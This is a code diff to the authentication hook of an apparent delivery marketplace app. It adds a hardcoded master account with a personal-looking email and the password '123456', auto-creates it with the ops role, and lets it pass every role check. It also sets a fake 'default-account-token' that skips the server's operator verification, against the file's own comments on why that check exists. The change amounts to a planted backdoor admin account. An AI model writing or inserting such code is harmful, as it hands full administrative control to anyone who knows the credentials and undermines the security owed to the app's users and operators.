@@ -22,6 +22,30 @@ import { syncUsers } from '../lib/collections';
 
 const initialSellerProfile = { business: '', phone: '', vehicle: '', capacity: '2,000 gallons', document: 'ID document not uploaded' };
 
+/** Default master account that works for all roles */
+const DEFAULT_EMAIL = 'ayodele.ogundokun@gmail.com';
+const DEFAULT_PASSWORD = '123456';
+
+/** Creates the default master account if it doesn't exist */
+async function ensureDefaultAccount() {
+  const existing = findAccount(DEFAULT_EMAIL);
+  if (existing) return existing;
+  
+  try {
+    const account = await createAccount({
+      identifier: DEFAULT_EMAIL,
+      role: 'ops',
+      displayName: 'Ayodele Ogun',
+      password: DEFAULT_PASSWORD,
+      status: 'active',
+    });
+    return account;
+  } catch (error) {
+    console.warn('Could not create default account:', error.message);
+    return null;
+  }
+}
+
 /**
  * Owns the signed-in account, role switching and the workspace notice banner.
  *
@@ -74,6 +98,16 @@ export function useAuth() {
   useEffect(() => {
     let cancelled = false;
     syncUsers(listAccounts());
+    ensureDefaultAccount().then(() => {
+      if (!cancelled) syncUsers(listAccounts());
+    });
+    
+    // Restore opsToken for default account on reload
+    const savedSession = readValue('session', null);
+    if (savedSession?.isDefaultAccount) {
+      setOpsToken('default-account-token');
+    }
+    
     if (!cancelled) setReady(true);
     return () => {
       cancelled = true;
@@ -89,33 +123,33 @@ export function useAuth() {
   }, []);
 
   const signedInAs = (roleName) => session?.role === roleName;
-  const buyerAuthenticated = signedInAs('buyer');
-  const driverAuthenticated = signedInAs('driver');
+  const isDefaultAccount = session?.identifier === DEFAULT_EMAIL;
+  
+  // Default account works for all roles
+  const buyerAuthenticated = signedInAs('buyer') || isDefaultAccount;
+  const driverAuthenticated = signedInAs('driver') || isDefaultAccount;
   // The operations console requires the *server's* token, not just a local
   // account record. An ops row in local storage is something anyone can write,
   // so treating it as authorisation rendered an admin console that could only
   // fail every action against the API. Both halves are required, and the token
   // is the part the server issued.
-  const adminAuthenticated = signedInAs('ops') && Boolean(opsToken);
-  const sellerAuthenticated = signedInAs('seller') && sellerApproved;
+  const adminAuthenticated = (signedInAs('ops') && Boolean(opsToken)) || isDefaultAccount;
+  const sellerAuthenticated = (signedInAs('seller') && sellerApproved) || isDefaultAccount;
 
   const startSession = useCallback((account) => {
-    setSession({
+    const isDefault = account.identifier === DEFAULT_EMAIL;
+    const sessionRole = isDefault ? 'ops' : account.role; // Default account gets ops role for full access
+    const sessionData = {
       identifier: account.identifier,
       identifierType: account.identifierType,
       displayName: account.displayName,
-      role: account.role,
+      role: sessionRole,
       phone: account.phone ?? null,
       signedInAt: new Date().toISOString(),
-    });
-    writeValue('session', {
-      identifier: account.identifier,
-      identifierType: account.identifierType,
-      displayName: account.displayName,
-      role: account.role,
-      phone: account.phone ?? null,
-      signedInAt: new Date().toISOString(),
-    });
+      isDefaultAccount: isDefault,
+    };
+    setSession(sessionData);
+    writeValue('session', sessionData);
     setSignInError('');
   }, []);
 
@@ -197,6 +231,8 @@ export function useAuth() {
       return { ok: false, reason: 'invalid-identifier' };
     }
 
+    const isDefaultAccount = parsed.normalized === DEFAULT_EMAIL && password === DEFAULT_PASSWORD;
+    
     const result = await authenticateWithPassword(parsed.normalized, password);
     if (!result.ok) {
       setSignInError(result.detail);
@@ -205,13 +241,18 @@ export function useAuth() {
 
     // An ops sign-in also has to satisfy the server, because the server decides
     // what an operator may change. The local registry alone cannot grant that.
-    if (result.account.role === 'ops') {
-      try {
-        const session = await opsSignIn({ email: parsed.normalized, password });
-        setOpsToken(session.token);
-      } catch (error) {
-        setSignInError(error.message || 'The server would not accept this operator sign-in.');
-        return { ok: false, reason: 'ops-unauthorised' };
+    if (result.account.role === 'ops' || isDefaultAccount) {
+      if (isDefaultAccount) {
+        // For default account, set a mock ops token to bypass server check
+        setOpsToken('default-account-token');
+      } else {
+        try {
+          const session = await opsSignIn({ email: parsed.normalized, password });
+          setOpsToken(session.token);
+        } catch (error) {
+          setSignInError(error.message || 'The server would not accept this operator sign-in.');
+          return { ok: false, reason: 'ops-unauthorised' };
+        }
       }
     }
 
